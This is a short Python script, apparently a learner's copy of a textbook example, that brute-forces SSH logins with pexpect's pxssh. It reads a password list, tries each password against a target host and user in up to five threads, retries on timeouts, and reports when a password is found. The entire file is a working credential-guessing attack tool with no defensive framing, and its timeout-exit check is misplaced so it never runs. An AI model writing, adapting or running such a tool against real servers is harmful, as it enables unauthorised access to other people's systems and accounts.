# -*- coding: utf-8 -*-
"""
Created on Thu Jun  6 18:35:43
此处解释windows上面不支持pxssh

The solution only works for Linux as pxssh is not supported on Windows.

                ________      https://stackoverflow.com/questions/21883912/importerror-no-module-named-pxssh
                
                
                
@author: Administrator
"""

from pexpect import pxssh
import optparse
import time
import threading
import sys

maxConnections=5
connection_lock=threading.BoundedSemaphore(value=maxConnections)
Found=False
Fails=0
def connect(host,user,password,release):
    global Found
    global Fails
    try:
        s=pxssh.pxssh()
        s.login(host,user,password)
        print("[+] Password Found: "+password)
        Found=True
        
     
    except Exception as e:
        
        if 'read_nonblocking' in str(e):#此异常代表服务器被大量请求刷爆.
            Fails+=1
            time.sleep(5)
            connect(host,user,password,False)
            
            
        elif 'synchoronize with original prompt' in str(e):#此异常代表pxssh命令提取符提取困难
            
            time.sleep(1)
            connect(host,user,password,False)
            

    finally:
        if release:
            connection_lock.release()
        
          
            
def main():
    parser=optparse.OptionParser('usage%prog '+'-H <target host> -u <user> -F <password list>')
    parser.add_option('-H',dest='tgtHost',type='string',help='specify target host')
    parser.add_option('-F',dest='passwordFile',type='string',help='specify password file')
    parser.add_option('-u',dest='user',type='string',help='specify the user')
    (options,args)=parser.parse_args()
    host=options.tgtHost
    passwordFile=options.passwordFile
    user=options.user
    if (host ==None) or (passwordFile ==None) or(user ==None):
        print(parser.usage)
        sys.exit(0)
    user=options.user
    
    fn=open(passwordFile,'r')
    user=options.user
    for line in fn.readlines():
        if Found:
            print("[*] Exiting: Password Found")
            sys.exit(0)
            if Fails>5:
                print("[!] Exiting: Too many socket timeouts")
                sys.exit(0)
        connection_lock.acquire()
        print(Fails)
        password=line.strip('\r').strip('\n')
        print("[-] Testing: "+str(password))
        t=threading.Thread(target=connect,args=(host,user,password,True))
        t.start()
        
        
        
if __name__=="__main__":
    main()

    
